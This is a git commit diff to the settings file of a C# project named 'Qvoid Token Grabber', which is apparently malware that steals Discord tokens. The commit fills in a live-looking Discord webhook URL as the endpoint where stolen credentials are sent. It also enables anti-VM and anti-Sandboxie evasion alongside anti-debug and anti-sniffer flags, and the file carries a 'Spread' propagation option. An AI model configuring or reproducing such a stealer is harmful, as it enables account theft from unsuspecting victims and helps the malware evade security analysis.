be23b014126469065d4b169e67689c29532cc1b1
KkjusTkk7074 <88614346+KkjusTkk7074@users.noreply.github.com>
2021-10-04 23:30:27 +0530

    Update Settings.cs

--- Qvoid Token Grabber/Qvoid Token Grabber/Main/Settings.cs
+++ Qvoid Token Grabber/Qvoid Token Grabber/Main/Settings.cs
@@ -3,14 +3,14 @@
     class Settings
     {
         //Discord
-        public static string Webhook      = "SOMEONE_SAID_WEBHOOK_QUESTION_MARK";
+        public static string Webhook      = "https://discordapp.com/api/webhooks/894249680668602378/nCEO5-ZAsY6fVo5i8TTufIq-dBM3dRmwHFrdDfT1UnQChOIlz1UwjVeXY3e1Pt5SJuzZ";
         public static bool Spread         = false; //Might not work, will be fixed on the next update ;^
 
         //Protection
         public static bool AntiWebSinffers = true;
         public static bool AntiDebug       = true;
-        public static bool AntiVM          = false;
-        public static bool AntiSandBoxie   = false;
+        public static bool AntiVM          = true;
+        public static bool AntiSandBoxie   = true;
         public static bool AntiEmulation   = true;
     }
 }
